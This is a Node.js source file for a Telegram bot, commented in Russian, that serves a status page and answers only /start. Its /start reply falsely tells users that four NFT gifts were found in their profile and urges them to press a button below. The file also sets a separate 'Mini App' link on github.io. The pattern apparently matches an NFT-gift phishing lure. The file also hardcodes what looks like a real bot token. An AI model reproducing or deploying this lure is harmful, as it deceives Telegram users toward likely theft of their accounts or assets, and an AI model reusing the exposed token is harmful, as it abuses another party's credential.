const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');

// ========== НАСТРОЙКИ ==========
const BOT_TOKEN = "8507666775:AAECjWysLyFc5Y_tFr8JpIEOaYZjp7J6ckc";
const WEB_APP_URL = "https://kaktizapisan.github.io/star/";
const PORT = process.env.PORT || 3000;
// ===============================

// Инициализация бота
const bot = new TelegramBot(BOT_TOKEN);
const app = express();

// Только статика
app.use(express.static(path.join(__dirname, 'public')));

// ========== ФУНКЦИИ БОТА ==========

// Простая проверка токена
async function checkToken() {
    try {
        await bot.getMe();
        console.log('✅ Бот авторизован');
        return true;
    } catch (error) {
        console.error('❌ Ошибка токена:', error.message);
        return false;
    }
}

// Настройка вебхука
async function setupWebhook() {
    try {
        // Для локального тестирования или если нет WEBHOOK_URL - используем polling
        if (!process.env.WEBHOOK_URL) {
            console.log('⚠️ WEBHOOK_URL не указан, запускаем polling...');
            bot.startPolling();
            return true;
        }

        const webhookUrl = `${process.env.WEBHOOK_URL}/webhook/${BOT_TOKEN}`;
        await bot.setWebHook(webhookUrl);
        console.log('✅ Вебхук установлен:', webhookUrl);
        return true;
    } catch (error) {
        console.log('⚠️ Ошибка вебхука, используем polling:', error.message);
        bot.startPolling();
        return true;
    }
}

// ========== КОМАНДЫ БОТА ==========

// Только /start - всё остальное игнорируем
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userName = msg.from.first_name || 'друг';
    
    try {
        // Отправляем приветствие с HTML форматированием
        await bot.sendMessage(chatId, 
            `🎉 Привет, ${userName}!\n\n` +
            `<b>‼️ В вашем профиле обнаружены 4 NFT подарка. Нажмите на кнопку ниже для просмотра.</b>`,
            { parse_mode: 'HTML' }
        );
        
        // Отдельное сообщение со стрелкой
        await bot.sendMessage(chatId, "👇");
        
        console.log(`✅ Команда /start от @${msg.from.username || 'no_username'} (${chatId})`);
    } catch (error) {
        console.error('❌ Ошибка отправки:', error.message);
    }
});

// Игнорируем все остальные сообщения (вообще ничего не отвечаем)
bot.on('message', (msg) => {
    // Не отвечаем на команду /start (она уже обработана выше)
    if (msg.text && msg.text.startsWith('/start')) {
        return;
    }
    // Полностью игнорируем все остальные сообщения - никакого ответа
});

// ========== EXPRESS СЕРВЕР ==========

// Простая страница статуса
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>NFT Bot Status</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    background: #1a1a2e; 
                    color: white; 
                    text-align: center; 
                    padding: 50px;
                }
                .status { 
                    background: #16213e; 
                    padding: 30px; 
                    border-radius: 10px; 
                    display: inline-block;
                }
                .online { color: #4CAF50; }
            </style>
        </head>
        <body>
            <div class="status">
                <h1>🤖 NFT Bot</h1>
                <h2 class="online">✅ БОТ РАБОТАЕТ</h2>
                <p>Отправьте <b>/start</b> в Telegram</p>
                <p>⏰ ${new Date().toLocaleString()}</p>
            </div>
        </body>
        </html>
    `);
});

// Эндпоинт для вебхука (если используется)
app.post(`/webhook/${BOT_TOKEN}`, (req, res) => {
    try {
        bot.processUpdate(req.body);
        res.sendStatus(200);
    } catch (error) {
        res.sendStatus(200); // Всегда возвращаем 200, чтобы Telegram не спамил повторными запросами
    }
});

// ========== ЗАПУСК ==========

async function start() {
    // Проверяем токен
    const isValid = await checkToken();
    if (!isValid) {
        console.log('❌ Неверный токен! Бот не запущен.');
        process.exit(1);
    }
    
    // Настраиваем вебхук или polling
    await setupWebhook();
    
    // Запускаем сервер
    app.listen(PORT, () => {
        console.log(`🚀 Сервер запущен на порту ${PORT}`);
        console.log(`📱 Mini App: ${WEB_APP_URL}`);
        console.log(`🤖 Бот: @${process.env.BOT_USERNAME || 'готов к работе'}`);
    });
}

start().catch(console.error);

// Корректное завершение
process.on('SIGINT', () => {
    console.log('\n🛑 Остановка...');
    process.exit();
});

process.on('SIGTERM', () => {
    console.log('\n🛑 Остановка...');
    process.exit();
});
